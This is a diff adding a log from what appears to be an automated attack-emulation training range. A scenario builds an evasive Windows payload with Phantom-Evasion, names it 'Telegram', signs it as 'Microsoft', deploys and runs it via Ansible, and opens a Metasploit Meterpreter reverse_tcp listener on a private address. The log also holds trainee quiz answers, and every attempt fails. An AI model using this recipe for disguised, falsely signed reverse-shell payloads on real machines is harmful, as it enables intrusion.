@@ -1,0 +1,170 @@
+2020-06-01 16:57:38,820- session-for-5ed4ed3d051e140dbc0be359 - INFO - Property Not Found
+2020-06-01 16:57:54,539- session-for-5ed4ed3d051e140dbc0be359 - INFO - ....................Parsing Scenario....................
+2020-06-01 16:57:54,578- session-for-5ed4ed3d051e140dbc0be359 - INFO - [{'TA24_T1345_P1': {'name': 'payload generation', 'tactic': 'Build_Capabilities', 'try_count': 1, 'platform': 'windows_10_1511', 'tool': 'phantom-evasion', 'command-prefix': 'python3', 'folder-path': '/home/Tools/Phantom-Evasion/', 'absolute-path': '/home/Tools/Phantom-Evasion/phantom-evasion.py', 'input': [{'Please insert option': '1'}, {'Please insert option': '2'}, {'Please insert option': '2'}, {'Please insert payload number': '3'}, {'Press Enter to continue': ''}, {'Please insert LHOST': 'LHOST_$ref'}, {'Please insert LPORT': 'LPORT_$ref'}, {'Please insert output filename': 'PAYLOAD_NAME_$ref'}, {'Add multiple processes behaviour': 'n'}, {'Strip executable\\?': 'y'}, {'Sign executable\\?': 'y'}, {'use already existing certificate': 'y'}, {'Select a Certificate': '1'}, {'Insert sign software description': 'Microsoft'}, {'Press Enter to continue': ''}, {'Please insert option': '0'}], 'options': {'LHOST_$ref': 'LHOST_$ref', 'LPORT_$ref': 'LPORT_$ref', 'PAYLOAD_NAME_$ref': 'PAYLOAD_NAME_$ref'}}}, {'TA08_T1105_P1': {'name': 'copy_file_to_windows', 'tactic': 'Lateral_Movement', 'try_count': 1, 'platform': 'windows_10_1511', 'tool': 'ansible', 'command-prefix': None, 'folder-path': None, 'absolute-path': None}}, {'TA01_T1091_P1': {'name': 'Payload_listener', 'tactic': 'Initial_Access', 'try_count': 5, 'spawn_seperate_session': True, 'type': 'listener', 'service': 'None', 'tool': 'metasploit', 'exploit': 'multi/handler', 'payload': 'windows/x64/meterpreter/reverse_tcp', 'options': {'LHOST': 'LHOST_$ref', 'LPORT': 'LPORT_$ref->Build_Capabilities'}, 'separate-thread': 'yes'}}, {'TA02_T1059_P1': {'name': 'execute_file_on_windows', 'tactic': 'Execution', 'try_count': 1, 'platform': 'windows_10_1511', 'tool': 'ansible', 'command-prefix': None, 'folder-path': None, 'absolute-path': None}}]
+2020-06-01 16:57:54,580- session-for-5ed4ed3d051e140dbc0be359 - INFO - *****************************Check tools status*****************************
+2020-06-01 16:57:54,580- session-for-5ed4ed3d051e140dbc0be359 - INFO - ['phantom-evasion', 'ansible', 'metasploit', 'ansible']
+2020-06-01 16:57:54,581- session-for-5ed4ed3d051e140dbc0be359 - INFO - /home/Tools/Phantom-Evasion/phantom-evasion.py = [32mTrue[0m
+2020-06-01 16:57:54,582- session-for-5ed4ed3d051e140dbc0be359 - INFO - ansible = [32mTrue[0m
+2020-06-01 16:57:54,583- session-for-5ed4ed3d051e140dbc0be359 - INFO - msfconsole = [32mTrue[0m
+2020-06-01 16:57:54,584- session-for-5ed4ed3d051e140dbc0be359 - INFO - ansible = [32mTrue[0m
+2020-06-01 16:57:54,584- session-for-5ed4ed3d051e140dbc0be359 - INFO - ************************Updating Session Tactics**********************
+2020-06-01 16:57:54,591- session-for-5ed4ed3d051e140dbc0be359 - INFO - Tacics list has been appended in list has been appended in evaluation
+2020-06-01 16:57:54,609- session-for-5ed4ed3d051e140dbc0be359 - INFO - ....................Spawning Phantom Evasion....................
+2020-06-01 16:57:54,609- session-for-5ed4ed3d051e140dbc0be359 - INFO - Reason: payload generation
+2020-06-01 16:58:05,177- session-for-5ed4ed3d051e140dbc0be359 - INFO - Please insert option: 1
+2020-06-01 16:58:05,836- session-for-5ed4ed3d051e140dbc0be359 - INFO - Please insert option: 2
+2020-06-01 16:58:06,393- session-for-5ed4ed3d051e140dbc0be359 - INFO - Please insert option: 2
+2020-06-01 16:58:07,954- session-for-5ed4ed3d051e140dbc0be359 - INFO - Please insert payload number: 3
+2020-06-01 16:58:08,111- session-for-5ed4ed3d051e140dbc0be359 - INFO - Press Enter to continue: 
+2020-06-01 16:58:08,268- session-for-5ed4ed3d051e140dbc0be359 - INFO - Please insert LHOST: 192.168.18.61
+2020-06-01 16:58:08,320- session-for-5ed4ed3d051e140dbc0be359 - INFO - Please insert LPORT: 25406
+2020-06-01 16:58:08,373- session-for-5ed4ed3d051e140dbc0be359 - INFO - Please insert output filename: Telegram
+2020-06-01 16:58:08,924- session-for-5ed4ed3d051e140dbc0be359 - INFO - Add multiple processes behaviour: n
+2020-06-01 16:58:14,579- session-for-5ed4ed3d051e140dbc0be359 - INFO - Strip executable\?: y
+2020-06-01 16:58:16,211- session-for-5ed4ed3d051e140dbc0be359 - INFO - Sign executable\?: y
+2020-06-01 16:58:16,272- session-for-5ed4ed3d051e140dbc0be359 - INFO - use already existing certificate: y
+2020-06-01 16:58:16,323- session-for-5ed4ed3d051e140dbc0be359 - INFO - Select a Certificate: 1
+2020-06-01 16:58:16,375- session-for-5ed4ed3d051e140dbc0be359 - INFO - Insert sign software description: Microsoft
+2020-06-01 16:58:17,731- session-for-5ed4ed3d051e140dbc0be359 - INFO - Press Enter to continue: 
+2020-06-01 16:58:18,189- session-for-5ed4ed3d051e140dbc0be359 - INFO - Please insert option: 0
+2020-06-01 16:58:18,190- session-for-5ed4ed3d051e140dbc0be359 - INFO - **************************Exploring Evaluation**********************
+2020-06-01 16:58:18,190- session-for-5ed4ed3d051e140dbc0be359 - WARNING - Mitre/Challenges/Build_Capabilities.json  not found
+2020-06-01 16:58:18,191- session-for-5ed4ed3d051e140dbc0be359 - INFO - ******[Scenario-ID: TA24_T1345_P1Tactic: Build_Capabilities executed]******
+2020-06-01 16:58:29,238- session-for-5ed4ed3d051e140dbc0be359 - INFO - **************************Exploring Evaluation**********************
+2020-06-01 16:58:29,238- session-for-5ed4ed3d051e140dbc0be359 - WARNING - Mitre/Challenges/Lateral_Movement.json  not found
+2020-06-01 16:58:29,238- session-for-5ed4ed3d051e140dbc0be359 - INFO - ******[Scenario-ID: TA08_T1105_P1Tactic: Lateral_Movement executed]******
+2020-06-01 16:58:29,242- session-for-5ed4ed3d051e140dbc0be359 - INFO - No Exceptions Found
+2020-06-01 16:58:29,291- session-for-5ed4ed3d051e140dbc0be359 - INFO - post not needed
+2020-06-01 16:58:29,311- session-for-5ed4ed3d051e140dbc0be359 - INFO - exploit['LHOST'] not needed...
+2020-06-01 16:58:29,311- session-for-5ed4ed3d051e140dbc0be359 - INFO - exploit['LPORT'] not needed...
+2020-06-01 16:58:29,344- session-for-5ed4ed3d051e140dbc0be359 - INFO - cid: 0
+2020-06-01 16:58:29,344- session-for-5ed4ed3d051e140dbc0be359 - INFO - Starting Another Thread
+2020-06-01 16:58:29,344- metasploit-thread - INFO - ....................Executing Exploit......................................
+2020-06-01 16:58:31,127- metasploit-thread - INFO - {'job_id': 0, 'uuid': 'g6lcgiqf'}
+2020-06-01 16:58:31,134- metasploit-thread - INFO - Meterpreter Sessions list empty: {}
+2020-06-01 16:58:34,147- metasploit-thread - INFO - Meterpreter Sessions list empty: {}
+2020-06-01 16:58:34,347- session-for-5ed4ed3d051e140dbc0be359 - INFO - **************************Exploring Evaluation**********************
+2020-06-01 16:58:34,360- session-for-5ed4ed3d051e140dbc0be359 - INFO - Appending Generalize questions_answers
+2020-06-01 16:58:34,361- session-for-5ed4ed3d051e140dbc0be359 - INFO - Appending scenario-specific questions_answers
+2020-06-01 16:58:34,361- session-for-5ed4ed3d051e140dbc0be359 - INFO - *****************************Questions*****************************
+2020-06-01 16:58:34,361- session-for-5ed4ed3d051e140dbc0be359 - INFO - {'General_question_1': {' What is Ip address of Attacker?': 'LHOST_$ref'}, 'General_question_4': {" Write Attacker's port of listening?": 'LPORT_$ref'}, 'Question_1': {' Write the path of directory in which payload is present? ': 'generated_payload_destination_file_path_$ref'}, 'Question_2': {' What is the name of malicious software or service? ': 'PAYLOAD_NAME_$ref'}}
+2020-06-01 16:58:34,362- session-for-5ed4ed3d051e140dbc0be359 - INFO - *****************************Actual Answers*****************************
+2020-06-01 16:58:34,363- session-for-5ed4ed3d051e140dbc0be359 - INFO - ['192.168.18.61', 25406, '%USERPROFILE%\\Downloads\\', 'Telegram']
+2020-06-01 16:58:34,369- session-for-5ed4ed3d051e140dbc0be359 - INFO - evaluation id:5ed4ed3d051e140dbc0be35a
+2020-06-01 16:58:34,369- session-for-5ed4ed3d051e140dbc0be359 - INFO - ************************Updating Evaluation form for user**********************
+2020-06-01 16:58:34,378- session-for-5ed4ed3d051e140dbc0be359 - INFO - TA01_T1091_P1 has been appended in evaluation
+2020-06-01 16:58:34,378- session-for-5ed4ed3d051e140dbc0be359 - INFO - ******[Scenario-ID: TA01_T1091_P1Tactic: Initial_Access executed]******
+2020-06-01 16:58:34,382- session-for-5ed4ed3d051e140dbc0be359 - INFO - command is Telegram.exe
+2020-06-01 16:58:34,383- session-for-5ed4ed3d051e140dbc0be359 - CRITICAL - Exception Occured somewhere!!
+2020-06-01 16:58:34,384- session-for-5ed4ed3d051e140dbc0be359 - INFO - ....................Going 1 step back........................
+2020-06-01 16:58:34,388- session-for-5ed4ed3d051e140dbc0be359 - INFO - Exception Successfully Raised
+2020-06-01 16:58:34,388- session-for-5ed4ed3d051e140dbc0be359 - INFO - Exception caught
+2020-06-01 16:58:34,388- session-for-5ed4ed3d051e140dbc0be359 - INFO - No Exceptions Found
+2020-06-01 16:58:34,408- session-for-5ed4ed3d051e140dbc0be359 - INFO - post not needed
+2020-06-01 16:58:34,427- session-for-5ed4ed3d051e140dbc0be359 - INFO - exploit['LHOST'] not needed...
+2020-06-01 16:58:34,427- session-for-5ed4ed3d051e140dbc0be359 - INFO - exploit['LPORT'] not needed...
+2020-06-01 16:58:34,445- session-for-5ed4ed3d051e140dbc0be359 - INFO - cid: 1
+2020-06-01 16:58:34,445- session-for-5ed4ed3d051e140dbc0be359 - INFO - Starting Another Thread
+2020-06-01 16:58:34,445- metasploit-thread - INFO - ....................Executing Exploit......................................
+2020-06-01 16:58:36,148- metasploit-thread - INFO - {'job_id': 1, 'uuid': 'okfayoys'}
+2020-06-01 16:58:36,155- metasploit-thread - INFO - Meterpreter Sessions list empty: {}
+2020-06-01 16:58:39,168- metasploit-thread - INFO - Meterpreter Sessions list empty: {}
+2020-06-01 16:58:39,450- session-for-5ed4ed3d051e140dbc0be359 - INFO - ******[Scenario-ID: TA01_T1091_P1Tactic: Initial_Access executed]******
+2020-06-01 16:58:39,456- session-for-5ed4ed3d051e140dbc0be359 - INFO - command is Telegram.exe
+2020-06-01 16:58:39,457- session-for-5ed4ed3d051e140dbc0be359 - CRITICAL - Exception Occured somewhere!!
+2020-06-01 16:58:39,457- session-for-5ed4ed3d051e140dbc0be359 - INFO - ....................Going 2 step back........................
+2020-06-01 16:58:39,462- session-for-5ed4ed3d051e140dbc0be359 - INFO - Exception Successfully Raised
+2020-06-01 16:58:39,462- session-for-5ed4ed3d051e140dbc0be359 - INFO - Exception caught
+2020-06-01 16:58:46,365- session-for-5ed4ed3d051e140dbc0be359 - INFO - ******[Scenario-ID: TA08_T1105_P1Tactic: Lateral_Movement executed]******
+2020-06-01 16:58:46,371- session-for-5ed4ed3d051e140dbc0be359 - INFO - No Exceptions Found
+2020-06-01 16:58:46,387- session-for-5ed4ed3d051e140dbc0be359 - INFO - post not needed
+2020-06-01 16:58:46,406- session-for-5ed4ed3d051e140dbc0be359 - INFO - exploit['LHOST'] not needed...
+2020-06-01 16:58:46,406- session-for-5ed4ed3d051e140dbc0be359 - INFO - exploit['LPORT'] not needed...
+2020-06-01 16:58:46,423- session-for-5ed4ed3d051e140dbc0be359 - INFO - cid: 2
+2020-06-01 16:58:46,423- session-for-5ed4ed3d051e140dbc0be359 - INFO - Starting Another Thread
+2020-06-01 16:58:46,423- metasploit-thread - INFO - ....................Executing Exploit......................................
+2020-06-01 16:58:48,142- metasploit-thread - INFO - {'job_id': 2, 'uuid': 'hyrcfuon'}
+2020-06-01 16:58:48,149- metasploit-thread - INFO - Meterpreter Sessions list empty: {}
+2020-06-01 16:58:51,158- metasploit-thread - INFO - Meterpreter Sessions list empty: {}
+2020-06-01 16:58:51,429- session-for-5ed4ed3d051e140dbc0be359 - INFO - ******[Scenario-ID: TA01_T1091_P1Tactic: Initial_Access executed]******
+2020-06-01 16:58:51,445- session-for-5ed4ed3d051e140dbc0be359 - INFO - command is Telegram.exe
+2020-06-01 16:58:51,446- session-for-5ed4ed3d051e140dbc0be359 - CRITICAL - Exception Occured somewhere!!
+2020-06-01 16:58:51,446- session-for-5ed4ed3d051e140dbc0be359 - INFO - ....................Going 3 step back........................
+2020-06-01 16:58:51,454- session-for-5ed4ed3d051e140dbc0be359 - INFO - Exception Successfully Raised
+2020-06-01 16:58:51,455- session-for-5ed4ed3d051e140dbc0be359 - INFO - Exception caught
+2020-06-01 16:58:51,556- session-for-5ed4ed3d051e140dbc0be359 - INFO - ....................Spawning Phantom Evasion....................
+2020-06-01 16:58:51,557- session-for-5ed4ed3d051e140dbc0be359 - INFO - Reason: payload generation
+2020-06-01 16:58:51,558- session-for-5ed4ed3d051e140dbc0be359 - INFO - ['LPORT'] option not needed...
+2020-06-01 16:59:02,087- session-for-5ed4ed3d051e140dbc0be359 - INFO - Please insert option: 1
+2020-06-01 16:59:02,745- session-for-5ed4ed3d051e140dbc0be359 - INFO - Please insert option: 2
+2020-06-01 16:59:03,303- session-for-5ed4ed3d051e140dbc0be359 - INFO - Please insert option: 2
+2020-06-01 16:59:04,864- session-for-5ed4ed3d051e140dbc0be359 - INFO - Please insert payload number: 3
+2020-06-01 16:59:05,020- session-for-5ed4ed3d051e140dbc0be359 - INFO - Press Enter to continue: 
+2020-06-01 16:59:05,176- session-for-5ed4ed3d051e140dbc0be359 - INFO - Please insert LHOST: 192.168.18.61
+2020-06-01 16:59:05,228- session-for-5ed4ed3d051e140dbc0be359 - INFO - Please insert LPORT: 25406
+2020-06-01 16:59:05,279- session-for-5ed4ed3d051e140dbc0be359 - INFO - Please insert output filename: Telegram
+2020-06-01 16:59:05,831- session-for-5ed4ed3d051e140dbc0be359 - INFO - Add multiple processes behaviour: n
+2020-06-01 16:59:07,156- session-for-5ed4ed3d051e140dbc0be359 - INFO - Strip executable\?: y
+2020-06-01 16:59:08,716- session-for-5ed4ed3d051e140dbc0be359 - INFO - Sign executable\?: y
+2020-06-01 16:59:08,768- session-for-5ed4ed3d051e140dbc0be359 - INFO - use already existing certificate: y
+2020-06-01 16:59:08,820- session-for-5ed4ed3d051e140dbc0be359 - INFO - Select a Certificate: 1
+2020-06-01 16:59:08,871- session-for-5ed4ed3d051e140dbc0be359 - INFO - Insert sign software description: Microsoft
+2020-06-01 16:59:10,162- session-for-5ed4ed3d051e140dbc0be359 - INFO - Press Enter to continue: 
+2020-06-01 16:59:10,619- session-for-5ed4ed3d051e140dbc0be359 - INFO - Please insert option: 0
+2020-06-01 16:59:10,620- session-for-5ed4ed3d051e140dbc0be359 - INFO - ******[Scenario-ID: TA24_T1345_P1Tactic: Build_Capabilities executed]******
+2020-06-01 16:59:19,844- session-for-5ed4ed3d051e140dbc0be359 - INFO - ******[Scenario-ID: TA08_T1105_P1Tactic: Lateral_Movement executed]******
+2020-06-01 16:59:19,849- session-for-5ed4ed3d051e140dbc0be359 - INFO - No Exceptions Found
+2020-06-01 16:59:19,865- session-for-5ed4ed3d051e140dbc0be359 - INFO - post not needed
+2020-06-01 16:59:19,883- session-for-5ed4ed3d051e140dbc0be359 - INFO - exploit['LHOST'] not needed...
+2020-06-01 16:59:19,884- session-for-5ed4ed3d051e140dbc0be359 - INFO - exploit['LPORT'] not needed...
+2020-06-01 16:59:19,919- session-for-5ed4ed3d051e140dbc0be359 - INFO - cid: 3
+2020-06-01 16:59:19,920- session-for-5ed4ed3d051e140dbc0be359 - INFO - Starting Another Thread
+2020-06-01 16:59:19,920- metasploit-thread - INFO - ....................Executing Exploit......................................
+2020-06-01 16:59:21,648- metasploit-thread - INFO - {'job_id': 3, 'uuid': 'fnir50ul'}
+2020-06-01 16:59:21,654- metasploit-thread - INFO - Meterpreter Sessions list empty: {}
+2020-06-01 16:59:24,664- metasploit-thread - INFO - Meterpreter Sessions list empty: {}
+2020-06-01 16:59:24,926- session-for-5ed4ed3d051e140dbc0be359 - INFO - ******[Scenario-ID: TA01_T1091_P1Tactic: Initial_Access executed]******
+2020-06-01 16:59:25,017- session-for-5ed4ed3d051e140dbc0be359 - INFO - command is Telegram.exe
+2020-06-01 16:59:25,017- session-for-5ed4ed3d051e140dbc0be359 - CRITICAL - Exception Occured somewhere!!
+2020-06-01 16:59:25,018- session-for-5ed4ed3d051e140dbc0be359 - INFO - ....................Going 4 step back........................
+2020-06-01 16:59:25,024- session-for-5ed4ed3d051e140dbc0be359 - INFO - Exception Successfully Raised
+2020-06-01 16:59:25,025- session-for-5ed4ed3d051e140dbc0be359 - INFO - Exception caught
+2020-06-01 16:59:25,126- session-for-5ed4ed3d051e140dbc0be359 - INFO - ....................Spawning Phantom Evasion....................
+2020-06-01 16:59:25,126- session-for-5ed4ed3d051e140dbc0be359 - INFO - Reason: payload generation
+2020-06-01 16:59:25,127- session-for-5ed4ed3d051e140dbc0be359 - INFO - ['LPORT'] option not needed...
+2020-06-01 16:59:35,678- session-for-5ed4ed3d051e140dbc0be359 - INFO - Please insert option: 1
+2020-06-01 16:59:36,337- session-for-5ed4ed3d051e140dbc0be359 - INFO - Please insert option: 2
+2020-06-01 16:59:36,894- session-for-5ed4ed3d051e140dbc0be359 - INFO - Please insert option: 2
+2020-06-01 16:59:38,454- session-for-5ed4ed3d051e140dbc0be359 - INFO - Please insert payload number: 3
+2020-06-01 16:59:38,611- session-for-5ed4ed3d051e140dbc0be359 - INFO - Press Enter to continue: 
+2020-06-01 16:59:38,768- session-for-5ed4ed3d051e140dbc0be359 - INFO - Please insert LHOST: 192.168.18.61
+2020-06-01 16:59:38,820- session-for-5ed4ed3d051e140dbc0be359 - INFO - Please insert LPORT: 25406
+2020-06-01 16:59:38,871- session-for-5ed4ed3d051e140dbc0be359 - INFO - Please insert output filename: Telegram
+2020-06-01 16:59:39,423- session-for-5ed4ed3d051e140dbc0be359 - INFO - Add multiple processes behaviour: n
+2020-06-01 16:59:40,836- session-for-5ed4ed3d051e140dbc0be359 - INFO - Strip executable\?: y
+2020-06-01 16:59:42,397- session-for-5ed4ed3d051e140dbc0be359 - INFO - Sign executable\?: y
+2020-06-01 16:59:42,448- session-for-5ed4ed3d051e140dbc0be359 - INFO - use already existing certificate: y
+2020-06-01 16:59:42,499- session-for-5ed4ed3d051e140dbc0be359 - INFO - Select a Certificate: 1
+2020-06-01 16:59:42,551- session-for-5ed4ed3d051e140dbc0be359 - INFO - Insert sign software description: Microsoft
+2020-06-01 16:59:43,844- session-for-5ed4ed3d051e140dbc0be359 - INFO - Press Enter to continue: 
+2020-06-01 16:59:44,302- session-for-5ed4ed3d051e140dbc0be359 - INFO - Please insert option: 0
+2020-06-01 16:59:44,303- session-for-5ed4ed3d051e140dbc0be359 - INFO - ******[Scenario-ID: TA24_T1345_P1Tactic: Build_Capabilities executed]******
+2020-06-01 16:59:53,224- session-for-5ed4ed3d051e140dbc0be359 - INFO - ******[Scenario-ID: TA08_T1105_P1Tactic: Lateral_Movement executed]******
+2020-06-01 16:59:53,236- session-for-5ed4ed3d051e140dbc0be359 - INFO - No Exceptions Found
+2020-06-01 16:59:53,253- session-for-5ed4ed3d051e140dbc0be359 - INFO - post not needed
+2020-06-01 16:59:53,271- session-for-5ed4ed3d051e140dbc0be359 - INFO - exploit['LHOST'] not needed...
+2020-06-01 16:59:53,271- session-for-5ed4ed3d051e140dbc0be359 - INFO - exploit['LPORT'] not needed...
+2020-06-01 16:59:53,290- session-for-5ed4ed3d051e140dbc0be359 - INFO - cid: 4
+2020-06-01 16:59:53,290- session-for-5ed4ed3d051e140dbc0be359 - INFO - Starting Another Thread
+2020-06-01 16:59:53,290- metasploit-thread - INFO - ....................Executing Exploit......................................
+2020-06-01 16:59:55,116- metasploit-thread - INFO - {'job_id': 4, 'uuid': 'j3spbdiu'}
+2020-06-01 16:59:55,122- metasploit-thread - INFO - Meterpreter Sessions list empty: {}
+2020-06-01 16:59:58,144- metasploit-thread - INFO - Meterpreter Sessions list empty: {}
+2020-06-01 16:59:58,295- session-for-5ed4ed3d051e140dbc0be359 - INFO - ******[Scenario-ID: TA01_T1091_P1Tactic: Initial_Access executed]******
+2020-06-01 16:59:58,304- session-for-5ed4ed3d051e140dbc0be359 - INFO - command is Telegram.exe
+2020-06-01 16:59:58,305- session-for-5ed4ed3d051e140dbc0be359 - CRITICAL - Ending Attack due to bulk of errors
+2020-06-01 16:59:58,305- session-for-5ed4ed3d051e140dbc0be359 - CRITICAL - Final Exception, Execution Stopped for session id5ed4ed3d051e140dbc0be359
+2020-06-01 16:59:58,306- session-for-5ed4ed3d051e140dbc0be359 - INFO - Exception Successfully Raised
+2020-06-01 16:59:58,306- session-for-5ed4ed3d051e140dbc0be359 - INFO - Exception caught
+2020-06-01 16:59:58,306- session-for-5ed4ed3d051e140dbc0be359 - INFO - ....................Destroying Session.....................................
+2020-06-01 16:59:58,307- session-for-5ed4ed3d051e140dbc0be359 - INFO - ....................No Session available to destroy........................
